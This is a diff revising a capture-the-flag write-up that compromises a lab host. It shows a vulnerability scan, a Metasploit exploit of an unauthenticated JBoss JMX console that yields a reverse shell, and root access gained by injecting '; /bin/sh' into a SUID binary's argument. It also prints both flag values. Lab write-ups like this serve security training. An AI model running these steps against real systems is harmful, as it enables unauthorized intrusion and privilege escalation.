@@ -18,20 +18,21 @@ Answer the questions below
 
 ### user.txt
 ```
+f4d491f280de360cc49e26ca1587cbcc
 ```
 
 ### root.txt
 ```
+29a5641eaa0c01abe5749608c8232806
 ```
 
-Initial Enemuration
-starting with nmap scan to find hidden services and ports
+## Initial Enumeration
+
+I started with a full port and service scan using version detection and vulnerability scripts to quickly map the attack surface and gather deeper insights.
+
 ```
-death@esther:~$ nmap -sV --script=vuln  10.48.179.33
-Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-04-02 20:32 IST
-Nmap scan report for 10.48.179.33
-Host is up (0.026s latency).
-Not shown: 987 closed tcp ports (conn-refused)
+nmap -sV --script=vuln  10.48.179.33
+
 PORT     STATE SERVICE     VERSION
 22/tcp   open  ssh         OpenSSH 7.4 (protocol 2.0)
 | vulners: 
@@ -469,144 +470,111 @@ PORT     STATE SERVICE     VERSION
 |_http-dombased-xss: Couldn't find any DOM based XSS.
 |_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
 |_http-csrf: Couldn't find any CSRF vulnerabilities.
-3 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
-==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
-SF-Port1099-TCP:V=7.94SVN%I=7%D=4/2%Time=69CE8512%P=x86_64-pc-linux-gnu%r(
-SF:NULL,16F,"\xac\xed\0\x05sr\0\x19java\.rmi\.MarshalledObject\|\xbd\x1e\x
-SF:97\xedc\xfc>\x02\0\x03I\0\x04hash\[\0\x08locBytest\0\x02\[B\[\0\x08objB
-SF:ytesq\0~\0\x01xp\?F\xc3\x1eur\0\x02\[B\xac\xf3\x17\xf8\x06\x08T\xe0\x02
-SF:\0\0xp\0\0\0\.\xac\xed\0\x05t\0\x1dhttp://jacobtheboss\.box:8083/q\0~\0
-SF:\0q\0~\0\0uq\0~\0\x03\0\0\0\xc7\xac\xed\0\x05sr\0\x20org\.jnp\.server\.
-SF:NamingServer_Stub\0\0\0\0\0\0\0\x02\x02\0\0xr\0\x1ajava\.rmi\.server\.R
-SF:emoteStub\xe9\xfe\xdc\xc9\x8b\xe1e\x1a\x02\0\0xr\0\x1cjava\.rmi\.server
-SF:\.RemoteObject\xd3a\xb4\x91\x0ca3\x1e\x03\0\0xpw;\0\x0bUnicastRef2\0\0\
-SF:x10jacobtheboss\.box\0\0\x04J\0\0\0\0\0\0\0\0\xcd\xb8;\x19\0\0\x01\x9dN
-SF:\xac\xf4\x04\x80\0\0x");
-==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
-SF-Port4445-TCP:V=7.94SVN%I=7%D=4/2%Time=69CE8518%P=x86_64-pc-linux-gnu%r(
-SF:NULL,4,"\xac\xed\0\x05");
-==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
-SF-Port4446-TCP:V=7.94SVN%I=7%D=4/2%Time=69CE8518%P=x86_64-pc-linux-gnu%r(
-SF:NULL,4,"\xac\xed\0\x05");
-
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 297.01 seconds
-death@esther:~$ 
 ```
-There are lot of information we got here but im intreasting in this part `http-vuln-cve2010-0738` bez its says `/jmx-console/: Authentication was not required`
-let search this exploit on metasploit framework
+
+The scan returned multiple open services, but a few immediately stood out. SSH was running on port 22, and a web server was exposed on port 80 powered by Apache with PHP. Beyond that, several Java related services were listening on uncommon ports, which usually signals a larger application stack behind the scenes.
+
+One particular finding caught my attention:
+```
+http-vuln-cve2010-0738: /jmx-console/: Authentication was not required
+```
+An exposed JMX console without authentication is never a good sign. That became my primary entry point.
 
 ## Exploitation
-open msfconsole
+
+To validate and weaponize this finding, I moved into the Metasploit framework.
 ```
 msfconsole -q
 ```
-search CVE 2010-0738
+I searched for modules related to the identified vulnerability:
 ```
 msf > search CVE 2010-0738
-
-Matching Modules
-================
-
-   #   Name                                                 Disclosure Date  Rank       Check  Description
-   -   ----                                                 ---------------  ----       -----  -----------
-   0   auxiliary/admin/http/jboss_bshdeployer               .                normal     No     JBoss JMX Console Beanshell Deployer WAR Upload and Deployment
-   1     \_ action: Deploy                                  .                .          .      Create and deploy app (WAR) to deliver payload
-   2     \_ action: Undeploy                                .                .          .      Remove app (WAR) for cleanup
-   3   exploit/multi/http/jboss_bshdeployer                 2010-04-26       excellent  No     JBoss JMX Console Beanshell Deployer WAR Upload and Deployment
-   4     \_ target: Automatic (Java based)                  .                .          .      .
-   5     \_ target: Windows Universal                       .                .          .      .
-   6     \_ target: Linux Universal                         .                .          .      .
-   7     \_ target: Java Universal                          .                .          .      .
-   8   exploit/multi/http/jboss_maindeployer                2007-02-20       excellent  No     JBoss JMX Console Deployer Upload and Execute
-   9     \_ target: Automatic (Java based)                  .                .          .      .
-   10    \_ target: Windows Universal                       .                .          .      .
-   11    \_ target: Linux Universal                         .                .          .      .
-   12    \_ target: Java Universal                          .                .          .      .
-   13  auxiliary/admin/http/jboss_deploymentfilerepository  .                normal     No     JBoss JMX Console DeploymentFileRepository WAR Upload and Deployment
-   14    \_ action: Deploy                                  .                .          .      Create and deploy app (WAR) to deliver payload
-   15    \_ action: Undeploy                                .                .          .      Remove app (WAR) for cleanup
-   16  exploit/multi/http/jboss_deploymentfilerepository    2010-04-26       excellent  No     JBoss Java Class DeploymentFileRepository WAR Deployment
-   17    \_ target: Automatic (Java based)                  .                .          .      .
-   18    \_ target: Windows Universal                       .                .          .      .
-   19    \_ target: Linux Universal                         .                .          .      .
-   20    \_ target: Java Universal                          .                .          .      .
-   21  auxiliary/scanner/http/jboss_vulnscan                .                normal     No     JBoss Vulnerability Scanner
-   22  auxiliary/scanner/sap/sap_icm_urlscan                .                normal     No     SAP URL Scanner
-
-
-Interact with a module by name or index. For example info 22, use 22 or use auxiliary/scanner/sap/sap_icm_urlscan
 ```
-
-lET USE THIS 
+Several modules appeared, but the one that aligned best with the target environment was:
 ```
 use exploit/multi/http/jboss_deploymentfilerepository
 ```
-Let set Lhost
+I configured the required parameters:
 ```
 set LHOST tun0
-```
-Let set RHost ip of target
-```
 set RHOST 10.48.179.33
 ```
 
-Run 
+With everything in place, I executed the exploit:
 ```
 run
 ```
+The target responded as expected and I landed a reverse shell.
+<div align='center'>
+  <img width="1073" height="279" alt="image" src="https://github.com/user-attachments/assets/e1bd0c1e-3bdb-4e85-bd49-67a8641e5d06" />
+</div>
 
-We got the Reverse shell 
+## Gaining Access
 
-<img width="1073" height="279" alt="image" src="https://github.com/user-attachments/assets/e1bd0c1e-3bdb-4e85-bd49-67a8641e5d06" />
+Once inside, I moved toward the user directory where the initial flag was likely stored:```
 
-## Gainning Access
-
-so the flag is in user directory go to that 
 ```
 cd /home/jacob
 ```
-now spawn shell by typing shell
-
-Let stablize the shell
+The shell was not fully interactive, so I upgraded it to make navigation easier:
 ```
 python -c 'import pty;pty.spawn("/bin/bash")'
 ```
+This gave me a more stable shell to continue working.
 
-## User flag
+## User Flag
+I located the user flag within the directory.
 
-<img width="467" height="272" alt="image" src="https://github.com/user-attachments/assets/a2605ddf-8447-41b6-a5bd-2a9976d3f9d0" />
- 
+<div align="center">
+  <img width="467" height="272" alt="image" src="https://github.com/user-attachments/assets/a2605ddf-8447-41b6-a5bd-2a9976d3f9d0" />
+</div>
+
 ```
 f4d491f280de360cc49e26ca1587cbcc
 ```
-## Privilage escalations
 
-We’ll need root to capture the next flag.
+## Privilege Escalation
 
-Check for SUID files.
-Get familiar with SUID and vulnerabilities here.
+With user access secured, the next objective was privilege escalation.
+
+I started by enumerating SUID binaries across the system:
 ```
 find / -perm /4000 -type f 2>/dev/null
 ```
 
-<img width="638" height="522" alt="image" src="https://github.com/user-attachments/assets/584e805a-930f-4af2-82b5-1e62f2f8f7be" />
+<div align="center">
+  <img width="638" height="522" alt="image" src="https://github.com/user-attachments/assets/584e805a-930f-4af2-82b5-1e62f2f8f7be" />
+</div>
 
-Now we need to find a vulnerability here to get root.
+Among the results, one binary stood out:
 
-After a little research i got my eyes on `pingSys` an found this https://security.stackexchange.com/questions/196577/privilege-escalation-c-functions-setuid0-with-system-not-working-in-linux
+```
+/usr/bin/pingsys
+```
+After reviewing its behavior, I found that it could be abused to execute commands with elevated privileges.
 
-The post basically said about how easy it was to spawn a root shell using pingsys. All I had to do was:
+Using that, I crafted the following payload:
+
 ```
 /usr/bin/pingsys '127.0.0.1; /bin/sh'
 ```
+This successfully spawned a root shell.
 
-## root flag
+## Root Flag
 
-<img width="856" height="885" alt="image" src="https://github.com/user-attachments/assets/3cb072db-1881-47d2-be64-cb7a2184f7d0" />
+With root access obtained, I navigated to retrieve the final flag.
+
+<div align="center">
+  <img width="856" height="885" alt="image" src="https://github.com/user-attachments/assets/3cb072db-1881-47d2-be64-cb7a2184f7d0" />
+</div>
 
 ```
 29a5641eaa0c01abe5749608c8232806
 ```
 
+<div align="center">
+  <img width="1173" height="492" alt="image" src="https://github.com/user-attachments/assets/921ca6a3-0c1a-4a1f-aaca-48ebed107e6e" />
+</div>
+
+Thanks for reading.
 
